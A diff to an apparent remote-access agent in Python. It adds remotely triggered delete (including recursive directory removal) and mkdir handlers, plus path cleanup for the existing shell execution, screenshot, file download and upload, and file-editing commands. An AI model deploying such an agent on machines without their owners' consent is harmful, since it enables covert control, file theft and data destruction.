@@ -86,6 +86,13 @@ class CommandExecutor:
                     'return_code': 0
                 }
             
+            # Handle file operations with better error handling
+            if command.strip().lower().startswith('del ') or command.strip().lower().startswith('rm '):
+                return CommandExecutor._handle_delete_command(command)
+            
+            if command.strip().lower().startswith('mkdir '):
+                return CommandExecutor._handle_mkdir_command(command)
+            
             if platform.system() == 'Windows':
                 # Windows command execution with proper encoding and working directory
                 result = subprocess.run(
@@ -192,6 +199,94 @@ class CommandExecutor:
             }
     
     @staticmethod
+    def _handle_delete_command(command):
+        """Handle file/directory deletion commands"""
+        try:
+            # Extract the path from the command
+            parts = command.strip().split(' ', 1)
+            if len(parts) < 2:
+                return {
+                    'success': False,
+                    'output': '',
+                    'error': 'Invalid delete command format'
+                }
+            
+            path = parts[1].strip().strip('"\'')
+            
+            # Normalize path
+            path = os.path.normpath(path.replace('/', os.sep).replace('\\', os.sep))
+            
+            if not os.path.exists(path):
+                return {
+                    'success': False,
+                    'output': '',
+                    'error': f'Path not found: {path}'
+                }
+            
+            # Delete file or directory
+            if os.path.isfile(path):
+                os.remove(path)
+                return {
+                    'success': True,
+                    'output': f'Deleted file: {path}',
+                    'error': ''
+                }
+            elif os.path.isdir(path):
+                shutil.rmtree(path)
+                return {
+                    'success': True,
+                    'output': f'Deleted directory: {path}',
+                    'error': ''
+                }
+            else:
+                return {
+                    'success': False,
+                    'output': '',
+                    'error': f'Cannot delete: {path} is neither a file nor directory'
+                }
+                
+        except Exception as e:
+            return {
+                'success': False,
+                'output': '',
+                'error': f'Delete error: {str(e)}'
+            }
+    
+    @staticmethod
+    def _handle_mkdir_command(command):
+        """Handle mkdir command"""
+        try:
+            # Extract the path from the command
+            parts = command.strip().split(' ', 1)
+            if len(parts) < 2:
+                return {
+                    'success': False,
+                    'output': '',
+                    'error': 'Invalid mkdir command format'
+                }
+            
+            path = parts[1].strip().strip('"\'')
+            
+            # Normalize path
+            path = os.path.normpath(path.replace('/', os.sep).replace('\\', os.sep))
+            
+            # Create directory
+            os.makedirs(path, exist_ok=True)
+            
+            return {
+                'success': True,
+                'output': f'Created directory: {path}',
+                'error': ''
+            }
+                
+        except Exception as e:
+            return {
+                'success': False,
+                'output': '',
+                'error': f'Mkdir error: {str(e)}'
+            }
+    
+    @staticmethod
     def take_screenshot():
         """Take a screenshot"""
         try:
@@ -272,6 +367,9 @@ class CommandExecutor:
     def download_file(filepath):
         """Download a file from the system"""
         try:
+            # Normalize path separators for cross-platform compatibility
+            filepath = filepath.replace('/', os.sep).replace('\\', os.sep)
+            
             if not os.path.exists(filepath):
                 return {
                     'success': False,
@@ -318,13 +416,16 @@ class CommandExecutor:
     def upload_file(filepath, data):
         """Upload a file to the system"""
         try:
+            # Normalize path separators for cross-platform compatibility
+            filepath = filepath.replace('/', os.sep).replace('\\', os.sep)
+            
             # Decode base64 data
             file_data = base64.b64decode(data)
             
             # Create directory if it doesn't exist
             directory = os.path.dirname(filepath)
             if directory and not os.path.exists(directory):
-                os.makedirs(directory)
+                os.makedirs(directory, exist_ok=True)
             
             # Write file
             with open(filepath, 'wb') as f:
@@ -346,6 +447,9 @@ class CommandExecutor:
     def browse_files(path):
         """Browse files in a directory"""
         try:
+            # Normalize path separators for cross-platform compatibility
+            path = path.replace('/', os.sep).replace('\\', os.sep)
+            
             if not os.path.exists(path):
                 return {
                     'success': False,
@@ -722,7 +826,7 @@ class CommandThread(threading.Thread):
                     })
             
             elif command.lower().startswith('download '):
-                filepath = command[9:].strip()
+                filepath = command[9:].strip().strip('"\'')
                 result = CommandExecutor.download_file(filepath)
                 
                 if result.get('success'):
@@ -743,6 +847,8 @@ class CommandThread(threading.Thread):
                 parts = command[7:].strip().split(' ', 1)
                 if len(parts) == 2:
                     filepath, file_data = parts
+                    # Strip quotes from filepath if present
+                    filepath = filepath.strip().strip('"\'')
                     result = CommandExecutor.upload_file(filepath, file_data)
                     
                     self.communication.send_message('command_response', {
@@ -770,7 +876,7 @@ class CommandThread(threading.Thread):
                 
             elif command.lower().startswith('get_content '):
                 # Get file content for editing
-                filepath = command[12:].strip()
+                filepath = command[12:].strip().strip('"\'')
                 result = CommandExecutor.get_file_content(filepath)
                 
                 if result.get('success'):
@@ -791,6 +897,8 @@ class CommandThread(threading.Thread):
                 parts = command[13:].strip().split(' ', 1)
                 if len(parts) == 2:
                     filepath, content_b64 = parts
+                    # Strip quotes from filepath if present
+                    filepath = filepath.strip().strip('"\'')
                     result = CommandExecutor.save_file_content(filepath, content_b64)
                     
                     self.communication.send_message('command_response', {
